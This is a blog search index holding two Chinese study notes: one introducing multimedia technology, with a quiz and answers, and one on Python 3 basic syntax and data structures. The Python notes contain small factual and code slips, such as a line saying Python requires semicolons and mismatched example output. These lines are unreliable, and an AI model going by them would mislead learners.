<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>多媒体技术-绪论</title>
    <url>/2020/02/24/%E5%A4%9A%E5%AA%92%E4%BD%93%E6%8A%80%E6%9C%AF-%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><h2 id="媒体"><a href="#媒体" class="headerlink" title="媒体"></a>媒体</h2><h3 id="媒体的分类"><a href="#媒体的分类" class="headerlink" title="媒体的分类"></a>媒体的分类</h3><p>传统四大媒体（报纸，电视，广播，杂志），户外媒体，网络媒体，新媒体</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>媒体就是信息的载体（承载，储存，呈现，处理，传递）</p>
<h2 id="感觉媒体"><a href="#感觉媒体" class="headerlink" title="感觉媒体"></a>感觉媒体</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>直接作用于人的感觉器官，使人产生直接感觉的媒体</p>
<h3 id="信息形式（要素）"><a href="#信息形式（要素）" class="headerlink" title="信息形式（要素）"></a>信息形式（要素）</h3><p>文字，图形，图像，声音，动画，视频，味道，温度，气味</p>
<h2 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>将两个或两个以上的信息要素建立逻辑连接，集成为一个系统并具有交互性的就称为多媒体</p>
<h2 id="多媒体技术"><a href="#多媒体技术" class="headerlink" title="多媒体技术"></a>多媒体技术</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>将文字，图形，图像，声音，动画，视频等多种媒体信息通过计算机进行数字化采集，获取，压缩或者解压缩，编辑，存储等加工处理，使多种媒体信息建立逻辑连接，集成为一个系统并具有交互性</p>
<h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>利用计算机综合处理文字，图形，图像，声音，动画，视频等信息的技术</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><ol>
<li><p>以下属于多媒体特征的是：A,B,C<br>A.信息载体的多样性<br>B.信息载体的交互性<br>C.信息载体的集成性<br>D.信息技术的不变性</p>
</li>
<li><p>请根据多媒体的特性判断以下（1，2 ）属于多媒体的范畴。<br>（1）交互式视频游戏　　　　　<br>（2）有声图书<br>（3）彩色画报　　　　　　　　<br>（4）立体声音乐</p>
</li>
<li><p>多媒体技术未来发展的方向是（A,B,C,D ）。<br>（1）高分辨率，提高显示质量。<br>（2）高速度化，缩短处理时间。<br>（3）简单化，便于操作。<br>（4）智能化，提高信息识别能力。</p>
</li>
<li><p>在多媒体计算机系统中，不能用以存储多媒体信息的是<strong>B__</strong>。<br>A.磁带<br>B.光缆<br>C.磁盘<br>D.光盘</p>
</li>
<li><p>多媒体计算机中的媒体信息是指(A,B,C,D )<br>A.数字、文字<br>B.声音、图形<br>C.动画、视频<br>D.图像</p>
</li>
<li><p>在计算机发展的初期，人们用来承载信息的媒体是（B ）<br>A.数值<br>B.文字<br>C.声音<br>D.图形和图像</p>
</li>
<li><p>多媒体技术的主要特性有( C )<br>A.多样性、集成性、可扩充性<br>B.集成性、交互性、可扩充性<br>C.多样性、集成性、交互性<br>D.多样性、交互性、可扩充性</p>
<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E5%A4%9A%E5%AA%92%E4%BD%93%E6%8A%80%E6%9C%AF/%E7%BB%AA%E8%AE%BA.png" alt="avatar"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>多媒体技术</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/2/22-周报0</title>
    <url>/2020/02/22/Python/</url>
    <content><![CDATA[<h1 id="Python3基础语法"><a href="#Python3基础语法" class="headerlink" title="Python3基础语法"></a>Python3基础语法</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，Python3源码文件以UTF-O编码，所有的字符串都是unicode字符串。</p>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>第一个字符必须是字母或下划线_<br>其他部分由字母，数字和下划线组成<br>大小写敏感</p>
<h2 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">'False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'</span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>#为单行注释<br>多行注释可以使用多个#，’’’和”””</p>
<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>由于python的特色，需要分号作为结尾，也不需要{}来表示代码块，所以缩进尤为重要，是python区分不同代码块的重要环节；缩进的空格数可变，同一个代码块必须包含相同的缩进空格数<br>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"True"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"False"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>python通常是一行写完，如果语句很长，使用<code>\</code>反斜杠来实现多行语句</p>
<p>在[].{}.()中的多行语句不需要反斜杠</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>python有四种数据类型：整型，布尔型，浮点数和复数</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(整型)</span></span>  如<span class="number">1</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(布尔)</span></span>  如ture</span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(浮点数)</span></span>  如<span class="number">1.23</span></span><br><span class="line"><span class="function"><span class="title">complex</span><span class="params">(复数)</span></span>  如<span class="number">1</span>+<span class="number">2</span>j</span><br></pre></td></tr></table></figure>

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>python中单引号与双引号使用相同</p>
<p>三引号<code>&#39;&#39;&#39;</code>可以指定一个多行字符串</p>
<p>转义符<code>\</code></p>
<p>反斜杠可以转义，使用r可以让反斜杠不发生转义。如r”this is a line with \n” \n会正常显示 而不是换行</p>
<p>按字面意义级联字符串。如”this””is””string”会被自动转换为this is string</p>
<p>字符串可以用+连接，用*重复</p>
<p>python中字符串有两种索引方式，从左开始以0开始，从右开始以-1开始</p>
<p>字符串不可以改变</p>
<p>没有单独的字符类型，一个字符就是长度为1的字符串</p>
<p>字符串截取的语法格式为：<code>变量[头下标:尾下标:步长]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">'Runoob'</span></span><br><span class="line"></span><br><span class="line">print(str)  	<span class="comment">#输出字符串</span></span><br><span class="line">print(str[<span class="number">0</span>:<span class="number">-1</span>]) 	<span class="comment">#输出第一个到倒数第二个的所有字符</span></span><br><span class="line">print(str[<span class="number">0</span>]) 	<span class="comment">#输出第一个字符</span></span><br><span class="line">print(str[<span class="number">2</span>:<span class="number">5</span>]) 	<span class="comment">#输出从第三个开始到第五个的字符</span></span><br><span class="line">print(str + ‘你好’) 	<span class="comment">#连接字符串</span></span><br><span class="line">print(<span class="string">'hello\nrunoob'</span>) 	<span class="comment">#反斜杠转义</span></span><br><span class="line">print(<span class="string">r'hello\nrunoob'</span>) 	<span class="comment">#在字符串前加一个r，不发生转义</span></span><br></pre></td></tr></table></figure>

<h3 id="访问字符串中的值"><a href="#访问字符串中的值" class="headerlink" title="访问字符串中的值"></a>访问字符串中的值</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">var1 = 'Hello World!'</span><br><span class="line">var2 = <span class="string">"Runoob"</span></span><br><span class="line"> </span><br><span class="line">print (<span class="string">"var1[0]: "</span>, var1[0])</span><br><span class="line">print (<span class="string">"var2[1:5]: "</span>, var2[1:5])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="section">var1[0]:  H</span></span><br><span class="line"><span class="section">var2[1:5]:  unoo</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串更新"><a href="#字符串更新" class="headerlink" title="字符串更新"></a>字符串更新</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">var1 = <span class="string">'Hello World!'</span></span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">print</span> (<span class="string">"已更新字符串 : "</span>, var1[:6] + <span class="string">'Runoob!'</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">已更新字符串 :  Hello Runoob!</span><br></pre></td></tr></table></figure>

<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">+</span><span class="comment">	字符串连接	a</span> <span class="literal">+</span> <span class="comment">b</span> <span class="comment">输出结果：</span> <span class="comment">HelloPython</span></span><br><span class="line"><span class="comment">*	重复输出字符串	a*2</span> <span class="comment">输出结果：HelloHello</span></span><br><span class="line"><span class="comment"></span><span class="title">[</span><span class="title">]</span><span class="comment">	通过索引获取字符串中字符	a</span><span class="title">[</span><span class="comment">1</span><span class="title">]</span> <span class="comment">输出结果</span> <span class="comment">e</span></span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">a</span> = <span class="string">"Hello"</span></span><br><span class="line">b = <span class="string">"Python"</span></span><br><span class="line"> </span><br><span class="line">print(<span class="string">"a + b 输出结果："</span>, <span class="keyword">a</span> + b)</span><br><span class="line">print(<span class="string">"a * 2 输出结果："</span>, <span class="keyword">a</span> * <span class="number">2</span>)</span><br><span class="line">print(<span class="string">"a[1] 输出结果："</span>, <span class="keyword">a</span>[<span class="number">1</span>])</span><br><span class="line">print(<span class="string">"a[1:4] 输出结果："</span>, <span class="keyword">a</span>[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">a</span> + b 输出结果： HelloPython</span><br><span class="line"><span class="keyword">a</span> * <span class="number">2</span> 输出结果： HelloHello</span><br><span class="line"><span class="keyword">a</span>[<span class="number">1</span>] 输出结果： e</span><br><span class="line"><span class="keyword">a</span>[<span class="number">1</span>:<span class="number">4</span>] 输出结果： ell</span><br></pre></td></tr></table></figure>

<h3 id="三引号"><a href="#三引号" class="headerlink" title="三引号"></a>三引号</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">para_str = <span class="string">"""这是一个多行字符串的实例</span></span><br><span class="line"><span class="string">多行字符串可以使用制表符</span></span><br><span class="line"><span class="string">TAB ( \t )。</span></span><br><span class="line"><span class="string">也可以使用换行符 [ \n ]。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">print</span> (para_str</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">这是一个多行字符串的实例</span><br><span class="line">多行字符串可以使用制表符</span><br><span class="line">TAB (    )。</span><br><span class="line">也可以使用换行符 [ </span><br><span class="line"> ]。</span><br></pre></td></tr></table></figure>


<h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">capitalize()  第一个字符转大写</span><br><span class="line"></span><br><span class="line">center(width,fillchar)  指定一个宽度width居中的字符串，fillchar位填充的字符，默认为空格</span><br><span class="line"></span><br><span class="line">count(str,beg=0,<span class="keyword">end</span>=<span class="keyword">len</span>(<span class="keyword">string</span>))  返回<span class="keyword">str</span>在<span class="keyword">string</span>中出现的次数，beg和<span class="keyword">end</span>可以指定范围</span><br><span class="line"></span><br><span class="line"><span class="keyword">encode</span>(<span class="keyword">encoding</span>=<span class="string">'UTF-8'</span>,<span class="keyword">errors</span>=<span class="string">'strict'</span>)  以<span class="keyword">encoding</span>指定的编码格式编码字符串</span><br><span class="line"></span><br><span class="line">find(<span class="keyword">str</span>,beg=<span class="number">0</span>,<span class="keyword">end</span>=<span class="keyword">len</span>(<span class="keyword">string</span>))  查找<span class="keyword">str</span>字符是否在<span class="keyword">string</span>中，beg和<span class="keyword">end</span>指定范围</span><br><span class="line"></span><br><span class="line"><span class="keyword">upper</span>()  小写转大写</span><br><span class="line"></span><br><span class="line"><span class="keyword">lower</span>()  大写转小写</span><br><span class="line"></span><br><span class="line">swapcase()  将字符串中大写转换为小写，小写转换为大写</span><br><span class="line"></span><br><span class="line">islower()  如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 <span class="literal">True</span>，否则返回 <span class="literal">False</span></span><br><span class="line">isupper()  类似</span><br><span class="line"></span><br><span class="line"><span class="keyword">len</span>()  返回字符串长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">max</span>(<span class="keyword">str</span>)  返回最大值</span><br><span class="line"><span class="keyword">min</span>类似</span><br><span class="line"></span><br><span class="line"><span class="keyword">replace</span>(<span class="keyword">old</span>,<span class="keyword">new</span>[,<span class="keyword">max</span>])  把字符串中的str1转换成str2，如果<span class="keyword">max</span>指定，替换不超过<span class="keyword">max</span>次</span><br><span class="line"></span><br><span class="line"><span class="keyword">split</span>(<span class="keyword">str</span><span class="string">""</span>,<span class="keyword">num</span>=string.count(<span class="keyword">str</span>))  以<span class="keyword">str</span>为分隔符截取字符串</span><br></pre></td></tr></table></figure>

<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>类似于一个数组</p>
<h3 id="访问列表中的值"><a href="#访问列表中的值" class="headerlink" title="访问列表中的值"></a>访问列表中的值</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>];</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ];</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"list1[0]: "</span>, list1[<span class="number">0</span>])</span><br><span class="line">print (<span class="string">"list2[1:5]: "</span>, list2[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">list1[<span class="number">0</span>]:  Google</span><br><span class="line">list2[<span class="number">1</span>:<span class="number">5</span>]:  [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span> = [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">"原始列表 : "</span>, <span class="keyword">list</span>)</span><br><span class="line">del <span class="keyword">list</span>[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"删除第三个元素 : "</span>, <span class="keyword">list</span>)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">原始列表 :  [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>]</span><br><span class="line">删除第三个元素 :  [<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">2000</span>]</span><br></pre></td></tr></table></figure>

<h3 id="列表脚本操作符"><a href="#列表脚本操作符" class="headerlink" title="列表脚本操作符"></a>列表脚本操作符</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">len([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])   结果为<span class="number">3</span> 显示列表的长度</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]+[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]  结果为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] 组合</span><br><span class="line"></span><br><span class="line">[<span class="string">'hi'</span>]*<span class="number">4</span>   结果为[<span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>, <span class="string">'Hi!'</span>] 重复</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]   结果为True  元素是否存在于列表中</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]: print(x, end=<span class="string">" "</span>)   结果为<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>  迭代</span><br></pre></td></tr></table></figure>
<h3 id="列表常用函数"><a href="#列表常用函数" class="headerlink" title="列表常用函数"></a>列表常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">len</span><span class="params">(list)</span></span>  列表元素个数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">max</span><span class="params">(list)</span></span>  返回列表元素最大值</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">min</span><span class="params">(list)</span></span>  返回列表元素最小值</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">list</span><span class="params">(seq)</span></span>  将元组转换为列表</span><br></pre></td></tr></table></figure>
<h3 id="列表常用方法"><a href="#列表常用方法" class="headerlink" title="列表常用方法"></a>列表常用方法</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">list</span>.<span class="keyword">append</span>(obj)  在末尾添加新的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">count</span>(obj)  统计某个元素出现的个数</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">extend</span>(seq)  在列表末尾一次性追加另一个序列中的多个值</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">insert</span>(<span class="built_in">index</span>,obj)  将对象插入列表</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="built_in">remove</span>(obj)  移除列表中某个值的第一个匹配项</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">pop</span>([<span class="built_in">index</span>=-<span class="number">1</span>])  移除列表中的一个元素，并且返回该元素</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.<span class="keyword">sort</span>(key=None,<span class="built_in">reverse</span>=False)  对列表进行排序</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>.clear()  清空列表</span><br></pre></td></tr></table></figure>
<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改</p>
<p>元组使用小括号，列表使用方括号</p>
<p>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可</p>
<p>元组是不可变的</p>
<h3 id="访问元组"><a href="#访问元组" class="headerlink" title="访问元组"></a>访问元组</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">tup1 = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"tup1[0]: "</span>, tup1[<span class="number">0</span>])</span><br><span class="line">print (<span class="string">"tup2[1:5]: "</span>, tup2[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">tup1[<span class="number">0</span>]:  Google</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">tup = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (tup)</span><br><span class="line">del tup</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"删除后的元组 tup : "</span>)</span><br><span class="line"><span class="keyword">print</span> (tup)</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">删除后的元组 tup : </span><br><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">"test.py"</span>, <span class="built_in">line</span> <span class="number">8</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">    <span class="keyword">print</span> (tup)</span><br><span class="line">NameError: name <span class="string">'tup'</span> <span class="keyword">is</span> not defined</span><br></pre></td></tr></table></figure>
<h3 id="元组运算符"><a href="#元组运算符" class="headerlink" title="元组运算符"></a>元组运算符</h3><p>与列表几乎一致</p>
<h3 id="元组常用函数"><a href="#元组常用函数" class="headerlink" title="元组常用函数"></a>元组常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">tuple</span><span class="params">(iterable)</span></span>  将可迭代系列转换为元组</span><br><span class="line"></span><br><span class="line">其余函数与列表相同</span><br></pre></td></tr></table></figure>

<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
<p>字典的每个键值(key=&gt;value)对用冒号(:)分割，每个对之间用逗号(,)分割，整个字典包括在花括号({})中</p>
<h3 id="访问字典里的值"><a href="#访问字典里的值" class="headerlink" title="访问字典里的值"></a>访问字典里的值</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line">print (<span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>])</span><br><span class="line">print (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">dict[<span class="string">'Name'</span>]:  <span class="symbol">Runoob</span></span><br><span class="line">dict[<span class="string">'Age'</span>]:  <span class="number">7</span></span><br></pre></td></tr></table></figure>
<h3 id="删除字典元素"><a href="#删除字典元素" class="headerlink" title="删除字典元素"></a>删除字典元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> dict[<span class="string">'Name'</span>] <span class="comment"># 删除键 'Name'</span></span><br><span class="line">dict.clear()     <span class="comment"># 清空字典</span></span><br><span class="line"><span class="keyword">del</span> dict         <span class="comment"># 删除字典</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"dict['School']: "</span>, dict[<span class="string">'School'</span>])</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br><span class="line">TypeError: <span class="string">'type'</span> object <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br></pre></td></tr></table></figure>

<h3 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h3><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</p>
<p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</p>
<h3 id="字典常用函数"><a href="#字典常用函数" class="headerlink" title="字典常用函数"></a>字典常用函数</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">len</span><span class="params">(dict)</span></span>  计算字典元素个数，即键的总数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">str</span><span class="params">(dict)</span></span>  输出字典，以可打印的字符串表示</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">type</span><span class="params">(variable)</span></span>  返回输入的变量类型，如果变量是字典就返回字典类型</span><br></pre></td></tr></table></figure>
<h3 id="字典常用方法"><a href="#字典常用方法" class="headerlink" title="字典常用方法"></a>字典常用方法</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.clear</span>()  删除字典内所有元素</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.get</span>(key, default=None)  返回指定键的值，如果值不在字典中返回<span class="selector-tag">default</span>值</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.items</span>()  以列表返回可遍历的(键, 值) 元组数组</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">radiansdict</span><span class="selector-class">.values</span>()  返回一个迭代器，可以使用 <span class="selector-tag">list</span>() 来转换为列表</span><br></pre></td></tr></table></figure>

<h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input(<span class="string">"\n\n按下enter键后退出"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h2><p>语句之间必须用分号分隔</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys;x=<span class="string">'runoob'</span>;sys.stdout.write(x+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">runoob</span></span><br></pre></td></tr></table></figure>

<h2 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h2><p>像if,while,de和class这样的复合语句，首行以关键字开始，以冒号结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> expression : </span><br><span class="line">   suite</span><br><span class="line"><span class="keyword">elif</span> expression : </span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">else</span> : </span><br><span class="line">   suite</span><br></pre></td></tr></table></figure>

<h2 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h2><p>默认换行，不需要换行在变量尾部加上end=””</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">"a"</span></span><br><span class="line">y=<span class="string">"b"</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line">print( x )</span><br><span class="line">print( y )</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'---------'</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line">print( x, end=<span class="string">" "</span> )</span><br><span class="line">print( y, end=<span class="string">" "</span> )</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
<p>执行结果为：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">---------</span><br><span class="line">a b</span><br></pre></td></tr></table></figure>

<h2 id="import与from…import"><a href="#import与from…import" class="headerlink" title="import与from…import"></a>import与from…import</h2><p>在 python 用 import 或者 from…import 来导入相应的模块<br>将某个模块中的全部函数导入，格式为： from somemodule import *</p>
<p>导入sys模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">print(<span class="string">'================Python import mode=========================='</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'命令行参数为:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">    <span class="keyword">print</span> (i)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'\n python 路径为'</span>,sys.path)</span><br></pre></td></tr></table></figure>

<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>Python -h查看帮助</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符分为算数运算符，比较运算符，赋值运算符，逻辑运算符，位运算符，成员运算符，身份运算符</p>
